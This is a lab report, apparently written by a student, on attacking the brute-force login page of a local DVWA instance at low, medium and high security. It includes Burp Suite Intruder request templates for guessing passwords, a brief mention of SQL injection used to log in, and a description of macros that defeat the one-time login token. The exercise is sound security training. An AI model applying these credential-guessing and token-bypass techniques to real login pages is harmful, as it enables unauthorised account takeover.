# DVWA Security Lab Report

**Author:** Meesum Abbas  
**Target Application:** Damn Vulnerable Web Application (DVWA)  

## Environment Setup Description
Pulled `vulnerables/web-dvwa` from docker for `linux/amd-64` platform. Used the command `docker run -d --name dvwa --platform linux/amd64 -p 8080:80 vulnerables/web-dvwa` to create a container with the name `dvwa` and run it for amd64 platform (since working on ARM-architecture Mac).

---

## Executive Summary
This report documents the security testing and vulnerability assessment performed on the DVWA platform. The objective of this assessment is to identify, exploit, and document common web application vulnerabilities.

---


## 1. BruteForce 
* **Vulnerability Type:** Improper Authentication / Lack of Rate Limiting
* **OWASP Category:** A07:2021-Identification and Authentication Failures

### Security Level: Low
#### Attack: 
1. Signed in with the admin password username. 
2. Opened the link of the image and modified the url to get the list of all users. 
3. Used SQL injection to login.
![user sql injection](<evidences/brute/low/Screenshot 2026-03-12 at 10.25.56 AM.png>)
4. Also used cluster bomb attack with the 100 most common passwords to find the passwords for all users. Used Burp Suite Intruder with the payload 
```
GET /vulnerabilities/brute/?username=$username$&password=$password$&Login=Login HTTP/1.1
Host: localhost:8071
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:148.0) Gecko/20100101 Firefox/148.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.9
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://localhost:8071/vulnerabilities/brute/
Cookie: PHPSESSID=05qs47qrd3pvvs2gm0cr1he6b1; security=low
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
```
5. Used String Matching to verify which passwords were accepted

![users list](evidences/brute/low/users.png) 
![passwords list](evidences/brute/low/passwords.png)
![matched usernames to passwords](evidences/brute/low/matched.png)

---

### Security Level: Medium
#### Attack: 
1. This time sql injection failed.
2. However the same payload (after updating security to medium in cookies) worked in Burp Suite for finding. Payload:
```
GET /vulnerabilities/brute/?username=$username$&password=$password$&Login=Login HTTP/1.1
Host: localhost:8071
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:148.0) Gecko/20100101 Firefox/148.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.9
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://localhost:8071/vulnerabilities/brute/
Cookie: PHPSESSID=05qs47qrd3pvvs2gm0cr1he6b1; security=medium
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
```

![medium-bruteforce-run](evidences/brute/medium/bruteforce-pw-mdedium.png)

---
### Security Level: High
#### Attack: 
1. This time the default brutefroce failed. The paylooad now expects a user_token, generated each time the user visits the login page and is a one time token. Payload
```
GET /vulnerabilities/brute/?username=$username$&password=$password$&Login=Login HTTP/1.1
Host: localhost:8071
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:148.0) Gecko/20100101 Firefox/148.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.9
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://localhost:8071/vulnerabilities/brute/
Cookie: PHPSESSID=05qs47qrd3pvvs2gm0cr1he6b1; security=high
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
```
![Brute force](evidences/brute/high/failed.png)
2. However using macros, that fetch the user token from the html each time, we can send the requests.
![making a macro p1](evidences/brute/high/macro-1.png)

![making a macro p2](evidences/brute/high/macro-2.png)

![making a macro p3](evidences/brute/high/macro-3.png)

![making a macro p4](evidences/brute/high/macro-4.png)

![making a macro p5](evidences/brute/high/macro-5.png)
The final Payload: 
![payload](evidences/brute/high/payload.png) 
Success Evidence: 
![success evidence](evidences/brute/high/success.png)

---

### Note:
I have used Burp Suite for convenience and faster results, though most of this can be achieved by looping over the lists with a curl call. Also, I didn't want to have AI generate the script for me without me actually learning a lot so used this route.


